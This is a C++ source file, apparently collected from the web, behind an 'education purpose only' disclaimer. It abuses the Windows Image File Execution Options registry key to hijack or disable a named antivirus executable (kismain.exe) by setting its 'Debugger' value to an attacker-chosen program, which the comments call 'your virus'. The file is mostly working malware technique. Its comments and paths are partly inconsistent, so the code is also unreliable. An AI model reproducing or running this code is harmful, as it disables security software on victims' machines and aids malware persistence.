/*Education purpose only!
This software is only for education purpose.
It is strictly prohibited to use it in illegal ways.
The user shall be responsible for all consequences and the author shall not bear any responsibility. 
If you cannot abide by this agreement, please leave immediately.
By using this code, user clearly understands all possible consequences, agrees to and abides by this agreement.
The author reserves the right of final interpretation.
*/
#include <Windows.h>
#include <string>
using namespace std;
//The First string is you want to destroy,The Second string is  your virus full path(include name)
bool IFEO(string &JC,string &ExeName)
{
	HKEY hKey = NULL;
	string s="SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\";
	s += JC;
	DWORD dwDisposition = REG_CREATED_NEW_KEY;
	if (RegCreateKeyExA(HKEY_LOCAL_MACHINE,
		s.c_str(),
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition) == ERROR_SUCCESS)
	{
		LSTATUS res = RegSetValueExA(hKey, "Debugger", 0, REG_SZ, (BYTE*)ExeName.c_str(), ExeName.length());
		RegCloseKey(hKey);
		if(res==ERROR_SUCCESS)return true;
	}
	return false;
}
//
int main()
{
	string Name = "C:\\Program Files (x86)\\kingsoft\\kingsoft\ antivirus\\kismain.exe";//your virus full path
	string jc= "kismain.exe";//This is a anti-virus software
	if(IFEO(jc,Name))printf("SUCCESS");
	return 0;
}
//Additional Information
/*
all anti-virus software detacted!!!
It seems no useful at all,but it works in some situations.
Code collected from the Internet
*/